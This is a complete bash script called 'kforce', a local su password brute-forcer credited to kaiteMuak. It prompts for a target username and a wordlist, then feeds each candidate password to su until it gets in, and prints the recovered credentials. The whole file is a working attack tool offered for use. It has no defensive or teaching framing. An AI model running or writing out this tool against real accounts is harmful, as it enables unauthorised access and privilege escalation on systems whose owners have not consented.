#!/bin/bash

# Banner ASCII art - kforce
clear
echo -e "\e[1;32m"
cat << "EOF"
 ██╗  ██╗███████╗ ██████╗ ██████╗  ██████╗███████╗
 ██║ ██╔╝██╔════╝██╔═══██╗██╔══██╗██╔════╝██╔════╝
 █████╔╝ █████╗  ██║   ██║██████╔╝██║     █████╗  
 ██╔═██╗ ██╔══╝  ██║   ██║██╔══██╗██║     ██╔══╝  
 ██║  ██╗██║     ╚██████╔╝██║  ██║╚██████╗███████╗
 ╚═╝  ╚═╝╚═╝      ╚═════╝ ╚═╝  ╚═╝ ╚═════╝╚══════╝
EOF
echo -e "\e[0m"
echo -e "\e[1;36m        Local su Brute Forcer - by kaiteMuak\e[0m"
echo ""

# Ask for username
read -p "[+] Target username: " usuario

if [ -z "$usuario" ]; then
    echo "[-] You must enter a username."
    exit 1
fi

# Ask for wordlist
read -p "[+] Wordlist path: " wordlist

if [ -z "$wordlist" ]; then
    echo "[-] You must enter a wordlist."
    exit 1
fi

if [ ! -f "$wordlist" ]; then
    echo "[-] Wordlist not found at: $wordlist"
    exit 1
fi

echo ""
echo "[*] Starting attack against user: $usuario"
echo "[*] Using wordlist: $wordlist"
echo ""

# Brute force
while IFS= read -r pass; do
    if echo "$pass" | su "$usuario" -c "echo SUCCESS" 2>/dev/null | grep -q "SUCCESS"; then
        echo "[+] Password found: $usuario:$pass"
        exit 0
    fi
done < "$wordlist"

echo "[-] No password found for $usuario"
